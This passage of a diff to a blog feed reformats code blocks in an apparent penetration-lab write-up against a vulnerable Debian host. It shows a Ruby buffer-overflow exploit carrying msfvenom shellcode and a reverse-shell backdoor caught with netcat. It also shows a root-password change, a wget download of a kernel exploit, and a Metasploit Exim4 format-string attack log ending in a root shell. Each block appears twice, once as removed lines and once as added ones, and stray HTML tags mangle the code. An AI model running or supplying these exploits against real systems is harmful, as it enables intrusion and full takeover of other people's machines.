-</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">124</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
-</span><span class='line'><span class="n">exploit</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">[</span><span class="mh">0x0804898f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;p&gt;host = ARGV[0]</span>
-</span><span class='line'><span class="sr">host ||= &amp;ldquo;192.168.80.143&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="nb">puts</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Using</span> <span class="ss">host</span><span class="p">:</span> <span class="c1">#{host}&amp;rdquo;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">7777</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
-</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock lang:ruby %}
+root@kali32:~# cat exploit.rb</p>
+
+<h1>!/usr/bin/env ruby</h1>
+
+<p>require &lsquo;socket&rsquo;</p>
+
+<h1>root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd</h1>
+
+<h1>[repo/buffd]</h1>
+
+<h1>0x0804898f call eax</h1>
+
+<h1>0x08048efb call eax</h1>
+
+<h1>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec -b &lsquo;\x00\xff&rsquo; CMD=&ldquo;/tmp/commands&rdquo; -f ruby</h1>
+
+<p>buf =
+&ldquo;\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9&rdquo; +
+&ldquo;\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6&rdquo; +
+&ldquo;\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91&rdquo; +
+&ldquo;\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b&rdquo; +
+&ldquo;\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0&rdquo; +
+&ldquo;\xb8\x8e\x24\x01\x8b\xb1&rdquo;</p>
+
+<p>exploit = buf + &ldquo;A&rdquo; * (124 - buf.length)
+exploit &lt;&lt; [0x0804898f].pack(&ldquo;V&rdquo;)</p>
+
+<p>host = ARGV[0]
+host ||= &ldquo;192.168.80.143&rdquo;</p>
+
+<p>puts &ldquo;Using host: #{host}&rdquo;</p>
+
+<p>s = TCPSocket.new host, 7777
+s.puts(exploit)
+s.close
+{% endcodeblock %}</p>
 
 <p>Exploit runs arbitrary command that we put on vulnerable server to /tmp/commands.</p>
 
 <p>We connect to the host:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~# nc -lvp 1337
-</span><span class='line'>listening on [any] 1337 &hellip;
-</span><span class='line'>192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
-</span><span class='line'>connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
-</span><span class='line'>sh: no job control in this shell
-</span><span class='line'>sh-2.05b$ cd /tmp</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect</p>
+
+<p>root@kali32:~# nc -lvp 1337
+listening on [any] 1337 &hellip;
+192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
+sh: no job control in this shell
+sh-2.05b$ cd /tmp
+{% endcodeblock %}</p>
 
 <p>To obtain root privileges, we can run ssh server and put to &lsquo;/tmp/commands&rsquo;
 file the instructions to change root password:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>debian:/tmp# chmod +x commands
-</span><span class='line'>debian:/tmp# cat commands
-</span><span class='line'>echo -e &ldquo;1234\n1234\n&rdquo; | passwd</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+debian:/tmp# chmod +x commands
+debian:/tmp# cat commands
+echo -e &ldquo;1234\n1234\n&rdquo; | passwd
+{% endcodeblock %}</p>
 
 <p>Kernel is vulnerable too, using this exploit we can get uid 0 privileges:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sh-2.05b$ wget -O socksend.c &lt;a href="http://www.exploit-db.com/download/9479">http://www.exploit-db.com/download/9479&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+sh-2.05b$ wget -O socksend.c <a href="http://www.exploit-db.com/download/9479">http://www.exploit-db.com/download/9479</a>
+{% endcodeblock %}</p>
 
 <p>In Metasploit is there is another module which we can use to exploit Exim4
 (exploit/unix/smtp/exim4_string_format). To make it work correctly, we need
 to comment the following lines and also change exim to exim4:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="mi">114</span>     <span class="c1">#if not datastore[&amp;lsquo;SkipVersionCheck&amp;rsquo;] and self.banner !~ /Exim 4.6\d+/i</span>
-</span><span class='line'><span class="mi">115</span>     <span class="c1">#  fail_with(Failure::Unknown, &amp;ldquo;Warning: This version of Exim is not exploitable&amp;rdquo;)</span>
-</span><span class='line'><span class="mi">116</span>     <span class="c1">#end</span>
-</span><span class='line'><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span>
-</span><span class='line'><span class="mi">341</span>       <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">PATH</span><span class="o">=</span><span class="sr">/bin:/s</span><span class="ss">bin</span><span class="p">:</span><span class="sr">/usr/s</span><span class="ss">bin</span><span class="p">:</span><span class="sr">/usr/</span><span class="ss">bin</span><span class="p">:</span><span class="sr">/usr/</span><span class="n">local</span><span class="o">/</span><span class="ss">sbin</span><span class="p">:</span><span class="sr">/usr/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span> <span class="n">exim4</span> <span class="o">-</span><span class="n">C</span><span class="c1">#{temp_conf} -q\n&amp;rdquo;)</span>
-</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock lang:ruby %}
+114     #if not datastore[&lsquo;SkipVersionCheck&rsquo;] and self.banner !~ /Exim 4.6\d+/i
+115     #  fail_with(Failure::Unknown, &ldquo;Warning: This version of Exim is not exploitable&rdquo;)
+116     #end
+&hellip;
+341       sock.put(&ldquo;PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim4 -C#{temp_conf} -q\n&rdquo;)
+{% endcodeblock %}</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(exim4_string_format) > rexploit
-</span><span class='line'>[*] Reloading module&hellip;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>[&lt;em>] Started reverse double handler
-</span><span class='line'>[&lt;/em>] Connecting to 192.168.80.143:25 &hellip;
-</span><span class='line'>[&lt;em>] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
-</span><span class='line'>[&lt;/em>] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
-</span><span class='line'>[&lt;em>] EHLO: 250-SIZE 52428800
-</span><span class='line'>[&lt;/em>] EHLO: 250-PIPELINING
-</span><span class='line'>[&lt;em>] EHLO: 250 HELP
-</span><span class='line'>[&lt;/em>] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
-</span><span class='line'>[&lt;em>] MAIL: 250 OK
-</span><span class='line'>[&lt;/em>] RCPT: 250 Accepted
-</span><span class='line'>[&lt;em>] DATA: 354 Enter message, ending with &ldquo;.&rdquo; on a line by itself
-</span><span class='line'>[&lt;/em>] Constructing initial headers &hellip;
-</span><span class='line'>[&lt;em>] Constructing HeaderX &hellip;
-</span><span class='line'>[&lt;/em>] Constructing body &hellip;
-</span><span class='line'>[&lt;em>] Sending 50 megabytes of data&hellip;
-</span><span class='line'>[&lt;/em>] Ending first message.
-</span><span class='line'>[&lt;em>] Result: &ldquo;552 Message size exceeds maximum permitted\r\n&rdquo;
-</span><span class='line'>[&lt;/em>] Sending second message &hellip;
-</span><span class='line'>[&lt;em>] MAIL result: &ldquo;250 OK\r\n&rdquo;
-</span><span class='line'>[&lt;/em>] RCPT result: &ldquo;sh-2.05b$ &rdquo;
-</span><span class='line'>[&lt;em>] Looking for Perl to facilitate escalation&hellip;
-</span><span class='line'>[&lt;/em>] Perl binary detected, attempt to escalate&hellip;
-</span><span class='line'>[&lt;em>] Using Perl interpreter at /usr/bin/perl&hellip;
-</span><span class='line'>[&lt;/em>] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv&hellip;
-</span><span class='line'>[&lt;em>] Attempting to execute payload as root&hellip;
-</span><span class='line'>[&lt;/em>] Accepted the first client connection&hellip;
-</span><span class='line'>[&lt;em>] Accepted the second client connection&hellip;
-</span><span class='line'>[&lt;/em>] Command: echo QDibz6UzrEBUyJQT;
-</span><span class='line'>[&lt;em>] Writing to socket A
-</span><span class='line'>[&lt;/em>] Writing to socket B
-</span><span class='line'>[&lt;em>] Reading from sockets&hellip;
-</span><span class='line'>[&lt;/em>] Reading from socket B
-</span><span class='line'>[&lt;em>] B: &ldquo;QDibz6UzrEBUyJQT\r\n&rdquo;
-</span><span class='line'>[&lt;/em>] Matching&hellip;
-</span><span class='line'>[&lt;em>] A is input&hellip;
-</span><span class='line'>[&lt;/em>] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>id
-</span><span class='line'>uid=0(root) gid=0(root)</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock %}
+msf exploit(exim4_string_format) > rexploit
+[*] Reloading module&hellip;</p>
+
+<p>[<em>] Started reverse double handler
+[</em>] Connecting to 192.168.80.143:25 &hellip;
+[<em>] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
+[</em>] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
+[<em>] EHLO: 250-SIZE 52428800
+[</em>] EHLO: 250-PIPELINING
+[<em>] EHLO: 250 HELP
+[</em>] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
+[<em>] MAIL: 250 OK
+[</em>] RCPT: 250 Accepted
+[<em>] DATA: 354 Enter message, ending with &ldquo;.&rdquo; on a line by itself
+[</em>] Constructing initial headers &hellip;
+[<em>] Constructing HeaderX &hellip;
+[</em>] Constructing body &hellip;
+[<em>] Sending 50 megabytes of data&hellip;
+[</em>] Ending first message.
+[<em>] Result: &ldquo;552 Message size exceeds maximum permitted\r\n&rdquo;
+[</em>] Sending second message &hellip;
+[<em>] MAIL result: &ldquo;250 OK\r\n&rdquo;
+[</em>] RCPT result: &ldquo;sh-2.05b$ &rdquo;
+[<em>] Looking for Perl to facilitate escalation&hellip;
+[</em>] Perl binary detected, attempt to escalate&hellip;
+[<em>] Using Perl interpreter at /usr/bin/perl&hellip;
+[</em>] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv&hellip;
+[<em>] Attempting to execute payload as root&hellip;
+[</em>] Accepted the first client connection&hellip;
+[<em>] Accepted the second client connection&hellip;
+[</em>] Command: echo QDibz6UzrEBUyJQT;
+[<em>] Writing to socket A
+[</em>] Writing to socket B
+[<em>] Reading from sockets&hellip;
+[</em>] Reading from socket B
+[<em>] B: &ldquo;QDibz6UzrEBUyJQT\r\n&rdquo;
+[</em>] Matching&hellip;
+[<em>] A is input&hellip;
+[</em>] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200</p>
+
+<p>id
+uid=0(root) gid=0(root)
+{% endcodeblock %}</p>
 ]]></content>
   </entry>
   
